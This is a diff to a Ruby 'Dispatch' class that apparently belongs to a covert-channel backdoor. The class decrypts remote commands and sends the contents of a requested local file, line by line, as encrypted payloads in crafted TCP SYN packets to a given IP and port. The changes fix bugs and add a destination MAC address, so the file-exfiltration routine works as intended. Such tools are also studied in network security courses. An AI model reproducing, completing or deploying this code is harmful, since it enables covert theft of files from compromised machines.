@@ -16,10 +16,12 @@ class Dispatch
 
 	@response = ""
 	@interface = ""
+	@ethaddr = ""
 
-	def initialize(ciphertext, interface)
+	def initialize(ciphertext, interface, ethaddr)
 		plaintext = decrypt ciphertext
         @interface = interface
+        @ethaddr = ethaddr
 
 		# Split up the request so we can pass the parameters to the correct method
 		request = plaintext.split
@@ -59,34 +61,37 @@ class Dispatch
 		if ! File.file? path
 			return "Sorry, that file does not exist."
 		else
-			cfg = Utils.whoami?(:iface => opts[:dev])
+			cfg = Utils.whoami?(:iface => @interface)
 
 			File.open(path, "rb") do |file|
-				while(line = file.file.gets)
-				    tcp = TCPPacket.new
+				while(line = file.gets)
+				    tcp = TCPPacket.new(:config => cfg)
 					tcp.eth_saddr = cfg[:eth_saddr]
+					tcp.eth_daddr = @ethaddr
 					
 					tcp.tcp_src = rand(0xfff - 1024) + 1024
-					tcp.tcp_dst = port
+					tcp.tcp_dst = Integer(port)
 					tcp.tcp_flags.syn = 1
 					
-					tcp.ip_saddr = cfg[:saddr]
+					tcp.ip_saddr = cfg[:ip_saddr]
 					tcp.ip_daddr = ip
 					
 					tcp.payload = encrypt line
 					tcp.recalc
+					
 					tcp.to_w(@interface)
 				end
 			end
 			
 			tcp = TCPPacket.new
 			tcp.eth_saddr = cfg[:eth_saddr]
+			tcp.eth_daddr = @ethaddr
 					
 			tcp.tcp_src = rand(0xfff - 1024) + 1024
-			tcp.tcp_dst = port
-			tcp.tcp_flags.syn = 1
+			tcp.tcp_dst = Integer(port)
+			tcp.tcp_flags.fin = 1
 			
-			tcp.ip_saddr = cfg[:saddr]
+			tcp.ip_saddr = cfg[:ip_saddr]
 			tcp.ip_daddr = ip
 			
 			tcp.recalc
